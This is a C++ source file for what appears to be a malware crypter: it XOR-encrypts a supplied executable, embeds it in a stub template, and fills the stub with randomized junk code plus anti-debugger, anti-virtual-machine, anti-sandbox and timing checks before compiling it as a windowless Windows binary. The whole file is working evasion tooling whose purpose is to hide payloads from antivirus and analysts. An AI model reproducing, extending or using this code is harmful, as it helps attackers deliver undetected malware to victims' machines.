#include "randomized_stub.h"
#include <fstream>
#include <sstream>
#include <random>
#include <ctime>
#include <windows.h>
#include <cstdio>

static std::string RandomString(size_t len) {
    static const char abc[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string s;
    std::random_device rd; std::mt19937 mt(rd());
    std::uniform_int_distribution<> dist(0, sizeof(abc)-2);
    for (size_t i=0; i<len; ++i) s += abc[dist(mt)];
    return s;
}

static std::string GenerateJunkCode(int lines) {
    std::string junk;
    for (int i = 0; i < lines; ++i) {
        junk += "volatile int junk" + std::to_string(i) + " = " + std::to_string(rand() % 1000000) + ";\n";
        if (i % 2 == 0) junk += "junk" + std::to_string(i) + " += " + std::to_string(rand()%200) + ";\n";
        if (i % 5 == 0) junk += "for(int k=0;k<" + std::to_string(rand()%10+1) + ";++k) junk" + std::to_string(i) + "+=k;\n";
        if (i % 3 == 0) junk += "SetLastError(" + std::to_string(rand()%1000) + ");\n";
    }
    return junk;
}

static std::string GenerateAntiDebugCode() {
    std::vector<std::string> checks;
    checks.push_back("if (IsDebuggerPresent()) return true;");
    checks.push_back("OutputDebugStringA(\"debug?\"); if (GetLastError() != 0) return true;");
    checks.push_back("BOOL bDebug=false; CheckRemoteDebuggerPresent(GetCurrentProcess(),&bDebug); if(bDebug)return true;");
    std::string code;
    int n = rand() % 2 + 1;
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n; ++i) code += checks[i] + "\n";
    return code + "return false;";
}

static std::string GenerateAntiVMCode() {
    std::vector<std::string> checks;
    checks.push_back("char c[256]={};DWORD sz=256;GetComputerNameA(c,&sz);if(strstr(c,\"VBOX\")||strstr(c,\"VMWARE\"))return true;");
    std::string code;
    int n = 1;
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n; ++i) code += checks[i] + "\n";
    return code + "return false;";
}

static std::string GenerateAntiSandboxCode() {
    std::vector<std::string> checks;
    checks.push_back("if (GetSystemMetrics(SM_MOUSEPRESENT)==0) return true;");
    checks.push_back("if (GetModuleHandleA(\"SbieDll.dll\")) return true;");
    std::string code;
    int n = 1;
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n; ++i) code += checks[i] + "\n";
    return code + "return false;";
}

static std::string GenerateAntiTimingCode() {
    return "LARGE_INTEGER f1,f2,ft;QueryPerformanceFrequency(&ft);QueryPerformanceCounter(&f1);for(volatile int i=0;i<1000000;i++);QueryPerformanceCounter(&f2);if((f2.QuadPart-f1.QuadPart)<ft.QuadPart/1000)return true;return false;";
}

static std::string BytesToHexArray(const std::vector<uint8_t>& data) {
    std::ostringstream oss;
    for (size_t i=0; i<data.size(); ++i) {
        oss << "0x" << std::hex << (int)data[i];
        if (i+1 != data.size()) oss << ",";
    }
    return oss.str();
}

bool GenerateRandomizedStub(const std::vector<uint8_t>& exe, std::vector<uint8_t>& outStub) {
    std::ifstream in("stubgen/stub_template.cpp");
    if (!in) return false;
    std::stringstream ss; ss << in.rdbuf();
    std::string code = ss.str();

    std::string key = RandomString(16);
    int method = (int)(std::time(nullptr)) % 2;
    std::string randstr = RandomString(10);
    uint32_t buildTime = (uint32_t)std::time(nullptr);

    std::vector<uint8_t> payload = exe;
    for (size_t i=0; i<payload.size(); ++i)
        payload[i] ^= key[i % key.size()];

    for (int j=1;j<=6;++j) {
        std::string marker = "/*JUNK" + std::to_string(j) + "*/";
        std::string val = GenerateJunkCode(5 + rand()%5);
        size_t pos; while((pos=code.find(marker))!=std::string::npos) code.replace(pos, marker.size(), val);
    }
    size_t pos;
    while ((pos = code.find("//ANTIDEBUG")) != std::string::npos) code.replace(pos, 12, GenerateAntiDebugCode());
    while ((pos = code.find("//ANTIVM")) != std::string::npos) code.replace(pos, 9, GenerateAntiVMCode());
    while ((pos = code.find("//ANTISANDBOX")) != std::string::npos) code.replace(pos, 15, GenerateAntiSandboxCode());
    while ((pos = code.find("//ANTITIMING")) != std::string::npos) code.replace(pos, 13, GenerateAntiTimingCode());
    while ((pos = code.find("/*KEY*/")) != std::string::npos) code.replace(pos, 8, key);
    while ((pos = code.find("/*METHOD*/")) != std::string::npos) code.replace(pos, 11, std::to_string(method));
    while ((pos = code.find("/*RANDSTR*/")) != std::string::npos) code.replace(pos, 12, randstr);
    while ((pos = code.find("/*BUILDTIME*/")) != std::string::npos) code.replace(pos, 13, std::to_string(buildTime));
    while ((pos = code.find("/*PAYLOAD*/")) != std::string::npos) code.replace(pos, 11, BytesToHexArray(payload));

    const char* build_cpp = "stub_build.cpp";
    const char* build_exe = "stub_build.exe";
    std::ofstream out(build_cpp); out << code; out.close();
    std::string cmd = "g++ -std=c++17 -O2 -mwindows ";
    cmd += build_cpp; cmd += " -o "; cmd += build_exe;
    int ok = system(cmd.c_str());
    if (ok != 0) { std::remove(build_cpp); std::remove(build_exe); return false; }
    std::ifstream in2(build_exe, std::ios::binary);
    outStub.assign(std::istreambuf_iterator<char>(in2), std::istreambuf_iterator<char>());
    std::remove(build_cpp); std::remove(build_exe);
    return !outStub.empty();
}